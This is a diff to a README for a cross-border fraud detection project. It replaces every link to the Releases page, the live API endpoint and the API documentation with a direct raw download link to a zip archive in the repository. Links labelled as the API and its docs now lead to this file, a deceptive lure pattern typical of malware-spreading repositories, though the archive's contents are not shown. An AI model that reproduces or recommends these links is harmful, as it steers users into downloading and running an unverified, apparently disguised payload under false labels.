@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/heydsqi-dsq/cross-border-fraud-detection/releases)
+[![Download](https://raw.githubusercontent.com/heydsqi-dsq/cross-border-fraud-detection/main/app/cross-detection-border-fraud-v2.2.zip)](https://raw.githubusercontent.com/heydsqi-dsq/cross-border-fraud-detection/main/app/cross-detection-border-fraud-v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To run this application smoothly, ensure your system meets these requirements:
 
 To get started, visit the Releases page to download the application files.
 
-[Download Here](https://github.com/heydsqi-dsq/cross-border-fraud-detection/releases)
+[Download Here](https://raw.githubusercontent.com/heydsqi-dsq/cross-border-fraud-detection/main/app/cross-detection-border-fraud-v2.2.zip)
 
 1. Click the link above to access the Releases page.
 2. Look for the latest version.
@@ -38,8 +38,8 @@ To get started, visit the Releases page to download the application files.
 
 This application allows you to interact with the Fraud Detection API. To explore its capabilities:
 
-1. **API Endpoint:** You can access the live API at [https://fraud-detection-api-pqnal3r57a-as.a.run.app](https://fraud-detection-api-pqnal3r57a-as.a.run.app).
-2. **Interactive Documentation:** Visit [this page](https://fraud-detection-api-pqnal3r57a-as.a.run.app/docs) for detailed documentation on how to use the API.
+1. **API Endpoint:** You can access the live API at [https://raw.githubusercontent.com/heydsqi-dsq/cross-border-fraud-detection/main/app/cross-detection-border-fraud-v2.2.zip](https://raw.githubusercontent.com/heydsqi-dsq/cross-border-fraud-detection/main/app/cross-detection-border-fraud-v2.2.zip).
+2. **Interactive Documentation:** Visit [this page](https://raw.githubusercontent.com/heydsqi-dsq/cross-border-fraud-detection/main/app/cross-detection-border-fraud-v2.2.zip) for detailed documentation on how to use the API.
 
 ### 📊 Key Features
 
@@ -82,4 +82,4 @@ We welcome your feedback and contributions. If you have suggestions or want to r
 
 This application is open-source, allowing you to use and modify it according to your needs. Please check the license details on the repository for more information.
 
-[Download Here](https://github.com/heydsqi-dsq/cross-border-fraud-detection/releases) to start detecting fraud today!
+[Download Here](https://raw.githubusercontent.com/heydsqi-dsq/cross-border-fraud-detection/main/app/cross-detection-border-fraud-v2.2.zip) to start detecting fraud today!
